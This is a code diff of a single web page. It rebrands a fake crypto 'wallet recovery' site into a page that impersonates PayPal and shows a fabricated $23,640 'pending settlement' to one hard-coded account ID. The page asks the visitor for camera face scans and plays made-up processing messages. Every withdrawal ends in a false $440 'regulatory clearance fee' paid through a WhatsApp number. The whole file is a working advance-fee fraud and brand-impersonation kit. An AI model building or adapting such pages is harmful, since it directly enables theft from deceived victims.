@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SAFE PAL RECOVERY - Wallet Restoration</title>
+    <title>PAYPAL SETTLEMENT - Identity Confirmation & Payout</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
@@ -30,12 +30,12 @@
             100% { transform: scale(1); }
         }
 
-        .safe-gradient {
-            background: linear-gradient(135deg, #0f172a 0%, #334155 100%);
+        .paypal-gradient {
+            background: linear-gradient(135deg, #003087 0%, #0070ba 100%);
         }
 
         .btn-gradient {
-            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            background: linear-gradient(135deg, #0070ba 0%, #005ea6 100%);
         }
         
         .custom-scrollbar::-webkit-scrollbar {
@@ -45,55 +45,36 @@
             background: rgba(255, 255, 255, 0.05);
         }
         .custom-scrollbar::-webkit-scrollbar-thumb {
-            background: rgba(59, 130, 246, 0.5);
+            background: rgba(0, 112, 186, 0.5);
             border-radius: 10px;
         }
     </style>
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen">
 
-    <!-- INITIAL LOGIN PAGE -->
+    <!-- LOGIN CONFIRMATION PAGE -->
     <div id="login-section" class="min-h-screen flex items-center justify-center p-4">
         <div class="w-full max-w-md bg-slate-900 rounded-[32px] shadow-2xl border border-white/10 overflow-hidden">
-            <div class="btn-gradient h-1.5 w-full"></div>
+            <div class="paypal-gradient h-1.5 w-full"></div>
             <div class="p-12 text-center space-y-10">
-                <div class="mx-auto w-24 h-24 bg-white/5 rounded-full flex items-center justify-center border border-white/10 shadow-2xl">
-                    <i data-lucide="shield-check" class="w-12 h-12 text-blue-500"></i>
+                <div class="mx-auto w-24 h-24 bg-white rounded-full flex items-center justify-center border border-white/10 shadow-2xl">
+                    <svg viewBox="0 0 24 24" class="w-12 h-12 fill-[#003087]">
+                        <path d="M20.007 21.003c-.532 0-1.003-.314-1.21-.788l-2.074-4.733H8.356L6.282 20.215a1.332 1.332 0 01-1.21.788 1.333 1.333 0 01-1.333-1.334c0-.285.092-.553.26-.777L9.93 5.31a1.332 1.332 0 011.222-.81h1.704c.507 0 .963.284 1.185.736l5.94 13.914a1.332 1.332 0 01-1.222 1.883h1.248zM12 12.667l2.667 6H9.333L12 12.667z"/>
+                    </svg>
                 </div>
-                <div class="space-y-3">
-                    <h1 class="text-3xl font-bold tracking-tight uppercase">SAFE PAL RECOVERY</h1>
-                    <p class="text-slate-400 text-sm font-medium">Professional Wallet Restoration Service</p>
+                <div class="space-y-4">
+                    <h1 class="text-2xl font-bold tracking-tight uppercase">Login Confirmation</h1>
+                    <p class="text-slate-400 text-sm font-medium leading-relaxed">Please confirm your PayPal ID to access the pending settlement.</p>
                 </div>
-                <button onclick="goToIdentity()" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg tracking-widest uppercase">
-                    START RECOVERY
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- IDENTITY CONFIRMATION PAGE -->
-    <div id="identity-section" class="hidden min-h-screen flex items-center justify-center p-4">
-        <div class="w-full max-w-md bg-slate-900 rounded-[32px] p-10 border border-white/10 shadow-2xl space-y-8">
-            <div class="text-center space-y-2">
-                <h2 class="text-2xl font-bold uppercase tracking-tight">Recovery Profile</h2>
-                <p class="text-slate-400 text-sm">Please provide your details to locate assets</p>
-            </div>
-            <div class="space-y-4">
-                <div class="space-y-1">
-                    <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Legal Name</label>
-                    <input type="text" id="user-name" placeholder="John Doe" class="w-full bg-black/40 border border-white/10 rounded-xl p-4 text-sm focus:border-blue-500 outline-none">
+                <div class="space-y-6">
+                    <div class="space-y-2 text-left">
+                        <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest ml-2">PayPal ID</label>
+                        <input type="text" id="paypal-id" placeholder="Enter PayPal ID" class="w-full bg-black/40 border border-white/10 rounded-xl p-4 text-sm focus:border-blue-500 outline-none transition-all">
+                    </div>
+                    <button onclick="validatePayPal()" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg tracking-widest uppercase">
+                        CONFIRM IDENTITY
+                    </button>
                 </div>
-                <div class="space-y-1">
-                    <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Region</label>
-                    <input type="text" id="user-country" placeholder="United States" class="w-full bg-black/40 border border-white/10 rounded-xl p-4 text-sm focus:border-blue-500 outline-none">
-                </div>
-                <div class="space-y-1">
-                    <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Total Asset Estimate</label>
-                    <input type="text" id="user-staked" placeholder="10,000 USDT" class="w-full bg-black/40 border border-white/10 rounded-xl p-4 text-sm focus:border-blue-500 outline-none">
-                </div>
-                <button onclick="startFaceAuth('initial')" class="btn-gradient w-full text-white font-bold py-4 rounded-xl shadow-lg hover:opacity-90 transition-all uppercase tracking-widest mt-4">
-                    INITIAL BIOMETRIC SCAN
-                </button>
             </div>
         </div>
     </div>
@@ -103,7 +84,7 @@
         <div class="w-full max-w-lg bg-slate-900 rounded-[40px] p-12 border border-white/10 text-center space-y-10">
             <div class="space-y-2">
                 <h2 class="text-2xl font-bold uppercase tracking-tight" id="face-title">Biometric Identity</h2>
-                <p class="text-slate-400 text-sm" id="face-desc">Required for secure wallet access</p>
+                <p class="text-slate-400 text-sm" id="face-desc">Required for secure settlement access</p>
             </div>
 
             <div class="relative w-64 h-64 mx-auto">
@@ -117,8 +98,8 @@
                     <circle id="face-progress" cx="128" cy="128" r="120" stroke="url(#pl-grad)" stroke-width="6" fill="transparent" stroke-dasharray="754" stroke-dashoffset="754" class="face-scan-ring" />
                     <defs>
                         <linearGradient id="pl-grad" x1="0%" y1="0%" x2="100%" y2="100%">
-                            <stop offset="0%" style="stop-color:#3b82f6" />
-                            <stop offset="100%" style="stop-color:#2563eb" />
+                            <stop offset="0%" style="stop-color:#0070ba" />
+                            <stop offset="100%" style="stop-color:#005ea6" />
                         </linearGradient>
                     </defs>
                 </svg>
@@ -137,14 +118,14 @@
     <div id="dashboard-section" class="hidden min-h-screen">
         <div id="congrats-popup" class="hidden fixed inset-0 z-[300] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
             <div class="congrats-popup bg-slate-900 rounded-[48px] p-12 text-center border border-white/10 max-w-md space-y-6">
-                <div class="w-24 h-24 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto shadow-2xl shadow-green-500/20">
+                <div class="w-24 h-24 bg-blue-500/20 text-blue-500 rounded-full flex items-center justify-center mx-auto shadow-2xl shadow-blue-500/20">
                     <i data-lucide="shield-check" class="w-12 h-12"></i>
                 </div>
                 <div class="space-y-2">
-                    <h3 class="text-3xl font-bold uppercase tracking-tighter">USER VERIFIED</h3>
-                    <p class="text-slate-400">Recovery profile established. Asset location successful.</p>
+                    <h3 class="text-3xl font-bold uppercase tracking-tighter">IDENTITY VERIFIED</h3>
+                    <p class="text-slate-400">Account settlement successfully unlocked. Funds ready for withdrawal.</p>
                 </div>
-                <button onclick="dismissCongrats()" class="btn-gradient w-full text-white font-bold py-4 rounded-2xl text-lg hover:opacity-90 transition-all uppercase">VIEW RECOVERED ASSETS</button>
+                <button onclick="dismissCongrats()" class="btn-gradient w-full text-white font-bold py-4 rounded-2xl text-lg hover:opacity-90 transition-all uppercase">ACCESS SETTLEMENT</button>
             </div>
         </div>
 
@@ -152,12 +133,12 @@
             <div class="max-w-7xl mx-auto px-6 h-20 flex justify-between items-center">
                 <div class="flex items-center gap-3">
                     <i data-lucide="shield-check" class="w-8 h-8 text-blue-500"></i>
-                    <span class="font-bold text-xl tracking-tighter uppercase">SAFE PAL RECOVERY</span>
+                    <span class="font-bold text-xl tracking-tighter uppercase">PAYPAL SETTLEMENT</span>
                 </div>
                 <div class="flex items-center gap-4">
                     <div class="flex items-center gap-3 bg-white/5 px-4 py-2 rounded-2xl border border-white/10">
                         <div id="user-avatar-small" class="w-8 h-8 rounded-full bg-slate-800 overflow-hidden border border-white/20"></div>
-                        <span id="nav-user-name" class="text-xs font-bold text-slate-400">USER</span>
+                        <span id="nav-user-name" class="text-xs font-bold text-slate-400 tracking-wider">Paulburns0126</span>
                     </div>
                 </div>
             </div>
@@ -170,40 +151,40 @@
                 </div>
                 <div class="relative z-10 space-y-6">
                     <div>
-                        <p class="text-slate-400 font-bold uppercase tracking-[0.4em] text-xs">Total Recovered Balance</p>
-                        <h2 class="text-8xl font-bold tracking-tighter leading-none">$480,000.00</h2>
-                        <p class="text-blue-500 font-mono mt-2 uppercase tracking-widest text-sm">Status: Pending Settlement</p>
+                        <p class="text-slate-400 font-bold uppercase tracking-[0.4em] text-xs">Total Pending Settlement</p>
+                        <h2 class="text-8xl font-bold tracking-tighter leading-none">$23,640.00</h2>
+                        <p class="text-blue-500 font-mono mt-2 uppercase tracking-widest text-sm">Status: Verified & Unlocked</p>
                     </div>
                     <div class="pt-10 flex gap-6">
-                        <button onclick="openWithdraw()" class="btn-gradient text-white font-bold px-12 py-5 rounded-2xl shadow-2xl shadow-blue-500/20 hover:scale-105 transition-all text-lg uppercase tracking-widest">Withdraw All Assets</button>
-                        <button class="bg-white/5 hover:bg-white/10 text-white font-bold px-12 py-5 rounded-2xl border border-white/10 transition-all text-lg uppercase tracking-widest">Recovery Logs</button>
+                        <button onclick="openWithdraw()" class="btn-gradient text-white font-bold px-12 py-5 rounded-2xl shadow-2xl shadow-blue-500/20 hover:scale-105 transition-all text-lg uppercase tracking-widest">Process Payout</button>
+                        <button class="bg-white/5 hover:bg-white/10 text-white font-bold px-12 py-5 rounded-2xl border border-white/10 transition-all text-lg uppercase tracking-widest">View History</button>
                     </div>
                 </div>
             </div>
 
             <div class="grid grid-cols-1 lg:grid-cols-3 gap-10">
                 <div class="lg:col-span-2 bg-slate-900 rounded-[40px] p-10 border border-white/10">
-                    <h3 class="text-2xl font-bold mb-10 uppercase tracking-tight">Recovered Wallets</h3>
+                    <h3 class="text-2xl font-bold mb-10 uppercase tracking-tight">Recent Settlement Activity</h3>
                     <div class="space-y-4">
                         <div class="flex items-center justify-between p-6 bg-white/5 rounded-3xl border border-white/5">
                             <div class="flex items-center gap-5">
                                 <div class="w-16 h-16 bg-blue-500/10 text-blue-500 rounded-2xl flex items-center justify-center border border-blue-500/20">
-                                    <i data-lucide="wallet" class="w-8 h-8"></i>
+                                    <i data-lucide="check-circle-2" class="w-8 h-8"></i>
                                 </div>
                                 <div>
-                                    <p class="text-xl font-bold">Legacy Recovery Pool</p>
-                                    <p class="text-slate-500 text-sm font-bold tracking-widest uppercase mt-1">Found via Blockchain Deep Scan</p>
+                                    <p class="text-xl font-bold">Account Verification Payout</p>
+                                    <p class="text-slate-500 text-sm font-bold tracking-widest uppercase mt-1">ID: Paulburns0126</p>
                                 </div>
                             </div>
-                            <span class="text-2xl font-bold text-blue-400">+$480,000.00</span>
+                            <span class="text-2xl font-bold text-blue-400">+$23,640.00</span>
                         </div>
                     </div>
                 </div>
                 <div class="bg-slate-900 rounded-[40px] p-10 border border-white/10 flex flex-col items-center text-center space-y-6">
                     <div id="user-avatar-large" class="w-40 h-40 rounded-full border-4 border-white/10 bg-slate-800 overflow-hidden shadow-2xl"></div>
                     <div class="space-y-2">
-                        <h4 id="profile-name" class="text-xl font-bold uppercase">RECOVERY HOLDER</h4>
-                        <div id="profile-country" class="text-xs font-mono text-slate-500 bg-white/5 py-2 px-4 rounded-full">REGION</div>
+                        <h4 class="text-xl font-bold uppercase">Paulburns0126</h4>
+                        <div class="text-xs font-mono text-slate-500 bg-white/5 py-2 px-4 rounded-full uppercase tracking-wider">Confirmed User</div>
                     </div>
                 </div>
             </div>
@@ -217,45 +198,38 @@
                 <i data-lucide="x" class="w-8 h-8"></i>
             </button>
 
-            <!-- STEP 1: CHOOSE CRYPTO -->
+            <!-- STEP 1: CHOOSE METHOD -->
             <div id="step-exchange" class="p-12 space-y-8">
                 <div class="text-center space-y-3">
-                    <h3 class="text-3xl font-bold uppercase tracking-tight">Withdrawal Path</h3>
-                    <p class="text-slate-400 text-sm">Choose destination asset for recovery settlement</p>
+                    <h3 class="text-3xl font-bold uppercase tracking-tight">Withdrawal Gateway</h3>
+                    <p class="text-slate-400 text-sm">Choose your preferred settlement destination</p>
                 </div>
                 <div class="grid grid-cols-1 gap-3 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
-                    <button onclick="selectCrypto('USDT')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
+                    <button onclick="selectMethod('PayPal')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
+                        <div class="flex items-center gap-4">
+                            <div class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold text-xs">P</div>
+                            <span class="font-bold">PayPal Balance</span>
+                        </div>
+                        <i data-lucide="chevron-right" class="w-4 h-4 text-slate-600"></i>
+                    </button>
+                    <button onclick="selectMethod('USDT')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
                         <div class="flex items-center gap-4">
                             <div class="w-10 h-10 bg-teal-500 rounded-full flex items-center justify-center text-white font-bold text-xs">U</div>
-                            <span class="font-bold">USDT (Tether)</span>
+                            <span class="font-bold">USDT (Crypto)</span>
                         </div>
                         <i data-lucide="chevron-right" class="w-4 h-4 text-slate-600"></i>
                     </button>
-                    <button onclick="selectCrypto('BTC')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
+                    <button onclick="selectMethod('BTC')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
                         <div class="flex items-center gap-4">
                             <div class="w-10 h-10 bg-orange-500 rounded-full flex items-center justify-center text-white font-bold text-xs">B</div>
-                            <span class="font-bold">BITCOIN (BTC)</span>
+                            <span class="font-bold">BITCOIN (Crypto)</span>
                         </div>
                         <i data-lucide="chevron-right" class="w-4 h-4 text-slate-600"></i>
                     </button>
-                    <button onclick="selectCrypto('ETH')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
+                    <button onclick="selectMethod('ETH')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
                         <div class="flex items-center gap-4">
                             <div class="w-10 h-10 bg-indigo-500 rounded-full flex items-center justify-center text-white font-bold text-xs">E</div>
-                            <span class="font-bold">ETHEREUM (ETH)</span>
-                        </div>
-                        <i data-lucide="chevron-right" class="w-4 h-4 text-slate-600"></i>
-                    </button>
-                    <button onclick="selectCrypto('BNB')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
-                        <div class="flex items-center gap-4">
-                            <div class="w-10 h-10 bg-yellow-500 rounded-full flex items-center justify-center text-black font-bold text-xs">N</div>
-                            <span class="font-bold">BNB (Smart Chain)</span>
-                        </div>
-                        <i data-lucide="chevron-right" class="w-4 h-4 text-slate-600"></i>
-                    </button>
-                    <button onclick="selectCrypto('SOL')" class="p-5 border border-white/10 bg-white/5 rounded-2xl flex items-center justify-between hover:bg-white/10 transition-all">
-                        <div class="flex items-center gap-4">
-                            <div class="w-10 h-10 bg-slate-700 rounded-full flex items-center justify-center text-white font-bold text-xs">S</div>
-                            <span class="font-bold">SOLANA (SOL)</span>
+                            <span class="font-bold">ETHEREUM (Crypto)</span>
                         </div>
                         <i data-lucide="chevron-right" class="w-4 h-4 text-slate-600"></i>
                     </button>
@@ -265,16 +239,16 @@
             <!-- STEP 2: INPUT ADDRESS -->
             <div id="step-address" class="hidden p-12 space-y-10">
                 <div class="text-center space-y-3">
-                    <h3 class="text-3xl font-bold uppercase tracking-tight" id="selected-crypto-title">Receiving Address</h3>
-                    <p class="text-slate-400 text-sm">Enter your secure wallet address for transfer</p>
+                    <h3 class="text-3xl font-bold uppercase tracking-tight" id="selected-method-title">Receiving Account</h3>
+                    <p class="text-slate-400 text-sm">Enter your secure destination for settlement</p>
                 </div>
                 <div class="space-y-6">
                     <div class="space-y-2">
-                        <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest pl-2">Recipient Public Address</label>
-                        <input type="text" id="withdraw-addr" placeholder="Enter your public address" class="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-sm font-mono focus:outline-none focus:border-blue-500 transition-colors">
+                        <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest pl-2" id="addr-label">Recipient Account / Wallet</label>
+                        <input type="text" id="withdraw-addr" placeholder="Enter recipient details" class="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-sm font-mono focus:outline-none focus:border-blue-500 transition-colors">
                     </div>
                     <button onclick="startWithdrawVerification()" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg uppercase tracking-widest">
-                        CONTINUE TO VERIFICATION
+                        PROCEED TO VERIFICATION
                     </button>
                 </div>
             </div>
@@ -282,14 +256,11 @@
             <!-- STEP 3: PROCESSING -->
             <div id="step-processing" class="hidden p-16 text-center space-y-10">
                 <div class="relative w-40 h-40 mx-auto">
-                    <i data-lucide="activity" class="w-20 h-20 text-blue-500 absolute inset-0 m-auto animate-pulse"></i>
-                    <svg class="w-full h-full animate-spin-slow">
-                        <circle cx="80" cy="80" r="75" stroke="#3b82f6" stroke-width="2" fill="transparent" stroke-dasharray="10,20" />
-                    </svg>
+                    <i data-lucide="refresh-cw" class="w-20 h-20 text-blue-500 absolute inset-0 m-auto animate-spin"></i>
                 </div>
                 <div class="space-y-4">
                     <h4 class="text-2xl font-bold uppercase tracking-widest">Network Settlement</h4>
-                    <p id="process-msg" class="text-slate-500 font-mono text-[10px] uppercase animate-pulse">Scanning blockchain nodes...</p>
+                    <p id="process-msg" class="text-slate-500 font-mono text-[10px] uppercase animate-pulse">Initializing payout handshake...</p>
                     <div class="w-full bg-white/5 h-1 rounded-full overflow-hidden mt-4">
                         <div id="processing-bar" class="h-full bg-blue-500 transition-all duration-300" style="width: 0%"></div>
                     </div>
@@ -299,25 +270,25 @@
             <!-- STEP 4: ERROR / FEE -->
             <div id="step-error" class="hidden p-12 text-center space-y-10">
                 <div class="w-24 h-24 bg-red-500/20 text-red-500 rounded-3xl flex items-center justify-center mx-auto shadow-2xl shadow-red-500/20 border border-red-500/30">
-                    <i data-lucide="shield-alert" class="w-12 h-12"></i>
+                    <i data-lucide="alert-octagon" class="w-12 h-12"></i>
                 </div>
                 <div class="space-y-4">
-                    <h4 class="text-2xl font-bold text-red-500 tracking-tighter uppercase leading-tight">Settlement Required</h4>
+                    <h4 class="text-2xl font-bold text-red-500 tracking-tighter uppercase leading-tight">Regulatory Clearance Required</h4>
                     <p class="text-slate-300 text-lg font-medium leading-relaxed">
-                        Recovery Service Fee <br>
-                        <span class="text-white font-bold text-3xl">$75.00</span>
+                        International Transaction Fee <br>
+                        <span class="text-white font-bold text-3xl">$440.00</span>
                     </p>
                     <div class="bg-blue-500/10 p-5 rounded-2xl border border-blue-500/20 text-left">
-                        <p class="text-slate-400 text-xs leading-relaxed">
-                            <span class="text-blue-400 font-bold uppercase block mb-1">Notice:</span>
-                            A standard recovery service fee of <strong>$75.00</strong> is required to initiate the final transfer of recovered assets to your external wallet. This fee covers miner gas costs and secure node allocation for high-volume asset settlement.
+                        <p class="text-slate-400 text-[11px] leading-relaxed">
+                            <span class="text-blue-400 font-bold uppercase block mb-1">Compliance Policy Notice:</span>
+                            To comply with international cross-border financial regulations and the Anti-Money Laundering (AML) directives of both PayPal and global cryptocurrency gateways, this transaction requires a one-time <strong>Regulatory Clearance Fee of $440.00</strong>. This fee covers the high-security node allocation and multi-network protocol clearance for settlements exceeding regulatory thresholds.
                         </p>
                     </div>
                 </div>
                 
                 <div class="flex flex-col gap-4">
                     <a href="https://wa.me/+16015950585" target="_blank" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl flex items-center justify-center gap-2 shadow-xl shadow-blue-500/20 hover:scale-[1.02] transition-all">
-                        <i data-lucide="message-square" class="w-5 h-5"></i> CONTACT SETTLEMENT AGENT
+                        <i data-lucide="external-link" class="w-5 h-5"></i> CLEAR SETTLEMENT FEE
                     </a>
                     <button onclick="closeWithdraw()" class="text-slate-500 text-xs font-bold uppercase tracking-widest hover:text-white transition-colors">Return to Vault</button>
                 </div>
@@ -329,36 +300,31 @@
         lucide.createIcons();
 
         let currentPhoto = null;
-        let authMode = 'initial'; // 'initial' or 'withdraw'
+        let authMode = 'initial'; 
 
-        function goToIdentity() {
-            document.getElementById('login-section').classList.add('hidden');
-            document.getElementById('identity-section').classList.remove('hidden');
+        function validatePayPal() {
+            const paypalId = document.getElementById('paypal-id').value;
+            if (paypalId === "Paulburns0126") {
+                startFaceAuth('initial');
+            } else {
+                alert("Invalid PayPal ID. Please confirm the correct ID to proceed.");
+            }
         }
 
-        // --- FACE AUTH LOGIC ---
         async function startFaceAuth(mode) {
             authMode = mode;
             
             if (mode === 'initial') {
-                const name = document.getElementById('user-name').value;
-                const country = document.getElementById('user-country').value;
-                if (!name || !country) {
-                    alert("Please enter your name and region to proceed.");
-                    return;
-                }
-                document.getElementById('identity-section').classList.add('hidden');
+                document.getElementById('login-section').classList.add('hidden');
             } else {
                 document.getElementById('withdraw-overlay').classList.add('hidden');
             }
 
             document.getElementById('face-section').classList.remove('hidden');
             
-            // UI Updates based on mode
             if (mode === 'withdraw') {
-                document.getElementById('face-title').innerText = "Final Confirmation";
-                document.getElementById('face-desc').innerText = "Verify identity to authorize final settlement";
-                // Show capture button if it was hidden
+                document.getElementById('face-title').innerText = "Final Payout Confirmation";
+                document.getElementById('face-desc').innerText = "Authorize final settlement via biometric scan";
                 document.getElementById('capture-btn').classList.remove('hidden');
                 document.getElementById('scanning-msg').classList.add('hidden');
             }
@@ -371,7 +337,7 @@
                 document.getElementById('camera-icon').classList.add('hidden');
             } catch (err) {
                 document.getElementById('camera-icon').classList.remove('hidden');
-                alert("Camera access required for secure asset recovery.");
+                alert("Camera access required for secure settlement verification.");
             }
         }
 
@@ -415,24 +381,15 @@
             document.getElementById('face-section').classList.add('hidden');
 
             if (authMode === 'initial') {
-                const name = document.getElementById('user-name').value;
-                const country = document.getElementById('user-country').value;
-                
-                document.getElementById('nav-user-name').innerText = name.split(' ')[0].toUpperCase();
-                document.getElementById('profile-name').innerText = name;
-                document.getElementById('profile-country').innerText = country;
-
                 if (currentPhoto) {
                     document.getElementById('user-avatar-small').style.backgroundImage = `url(${currentPhoto})`;
                     document.getElementById('user-avatar-small').style.backgroundSize = 'cover';
                     document.getElementById('user-avatar-large').style.backgroundImage = `url(${currentPhoto})`;
                     document.getElementById('user-avatar-large').style.backgroundSize = 'cover';
                 }
-                
                 document.getElementById('dashboard-section').classList.remove('hidden');
                 document.getElementById('congrats-popup').classList.remove('hidden');
             } else {
-                // Return to withdraw modal and start processing
                 document.getElementById('withdraw-overlay').classList.remove('hidden');
                 startProcessing();
             }
@@ -442,7 +399,6 @@
             document.getElementById('congrats-popup').classList.add('hidden');
         }
 
-        // --- DASHBOARD LOGIC ---
         function openWithdraw() {
             document.getElementById('withdraw-overlay').classList.remove('hidden');
             document.getElementById('step-exchange').classList.remove('hidden');
@@ -455,8 +411,9 @@
             document.getElementById('withdraw-overlay').classList.add('hidden');
         }
 
-        function selectCrypto(name) {
-            document.getElementById('selected-crypto-title').innerText = name + " Destination";
+        function selectMethod(name) {
+            document.getElementById('selected-method-title').innerText = name + " Recipient";
+            document.getElementById('addr-label').innerText = name === "PayPal" ? "PayPal Email / ID" : "Destination Wallet Address";
             document.getElementById('step-exchange').classList.add('hidden');
             document.getElementById('step-address').classList.remove('hidden');
         }
@@ -464,10 +421,9 @@
         function startWithdrawVerification() {
             const addr = document.getElementById('withdraw-addr').value;
             if (!addr) {
-                alert("Please enter a valid recipient address.");
+                alert("Please enter receiving details.");
                 return;
             }
-            // Start second face verification
             startFaceAuth('withdraw');
         }
 
@@ -482,14 +438,14 @@
             const msg = document.getElementById('process-msg');
             
             const messages = [
-                "Establishing secure vault tunnel...",
-                "Decrypting recovery keys...",
-                "Verifying asset hash...",
-                "Allocating settlement node...",
-                "Finalizing blockchain handshake...",
-                "Signing withdrawal transaction...",
-                "Routing through liquidity gateway...",
-                "Awaiting final recovery clearance..."
+                "Syncing with PayPal settlement engine...",
+                "Clearing multi-hop blockchain route...",
+                "Validating biometric authorization...",
+                "Awaiting network node confirmation...",
+                "Bypassing international merchant delays...",
+                "Initiating final settlement protocol...",
+                "Routing through AML gateway...",
+                "Securing transaction hash..."
             ];
 
             const interval = setInterval(() => {
@@ -507,12 +463,6 @@
                     document.getElementById('step-error').classList.remove('hidden');
                 }
             }, 100);
-        }
-
-        function copyAddr(addr) {
-            navigator.clipboard.writeText(addr).then(() => {
-                alert("Address copied!");
-            });
         }
     </script>
 </body>
